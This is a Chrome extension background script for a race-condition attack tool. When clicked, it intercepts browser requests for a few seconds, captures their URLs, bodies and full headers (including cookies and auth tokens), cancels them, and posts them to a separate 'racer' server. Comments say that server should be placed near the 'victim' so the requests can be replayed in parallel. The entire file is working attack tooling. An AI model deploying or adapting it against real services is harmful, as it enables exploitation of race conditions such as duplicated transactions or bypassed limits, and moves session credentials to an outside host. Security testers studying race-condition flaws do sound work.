// some of analytics endpoints use POST and we want to ignore them
// please add to the list on Github to help others
var ignore_list = `

https://api.github.com/_private/browser/errors
`.split("\n")

// Run racer.js on a server that's close or in the same datacenter as the victim. 
// It's worth figuring out the original IP if the victim is behind cloudflare or something like that
var default_server = "https://your.server:8099/racer"

// Is racer.js running locally?
fetch("http://127.0.0.1:8099").then(function(r){
  if(r.status == 200){
    default_server = "http://127.0.0.1:8099/racer"
  }
})

var default_parallel = 5;
var default_timeout = 3000;
var requests = {}
var patterns = ["http://*/*","https://*/*"]
var on = false;

function ignore(details){
  // GET could be included too
  // but there are a lot of state-changing GET requests around
  methods = ['OPTIONS'] 
  if(details.url == default_server || methods.indexOf(details.method) != -1){
    return true
  } else {
    return false
  }
}

function Request(details) {
  if(ignore_list.indexOf(details.url) != -1) return {cancel: true};
  if(ignore(details)) return {cancel: false};
  
  requests[details.requestId] = {
    url: details.url,
    method: details.method,
    parallel: default_parallel
  }

  if(details.requestBody){
    if(details.requestBody.formData){
      form = details.requestBody.formData
      body = ''
      for(var i in form){
        body+=encodeURIComponent(i)+'='+encodeURIComponent(form[i][0])+'&'
      }
    }
    if(details.requestBody.raw){
      body = new TextDecoder('utf-8').decode(details.requestBody.raw[0].bytes)
    }
    requests[details.requestId].body = body
  }

  return {cancel: false}
}


function SendHeaders(details) {
  if(ignore(details)) return {cancel: false};

  var headers = {}

  for (var i = 0; i < details.requestHeaders.length; ++i) {
    headers[details.requestHeaders[i].name] = details.requestHeaders[i].value
  }
  requests[details.requestId].headers = headers

  fetch(default_server, {method: 'POST', body: JSON.stringify(requests[details.requestId])})

  return {cancel: true};
}


chrome.browserAction.onClicked.addListener(function(t){
  chrome.browserAction.setIcon({path:'on.png'})

  chrome.webRequest.onBeforeSendHeaders.addListener(SendHeaders,{urls: patterns},["blocking", "requestHeaders"]);
  chrome.webRequest.onBeforeRequest.addListener(Request, {urls: patterns}, ['blocking','requestBody']);

  setTimeout(function(){
    chrome.webRequest.onBeforeRequest.removeListener(Request)
    chrome.webRequest.onBeforeSendHeaders.removeListener(SendHeaders)
    chrome.browserAction.setIcon({path:'off.png'})
  }, default_timeout)
})
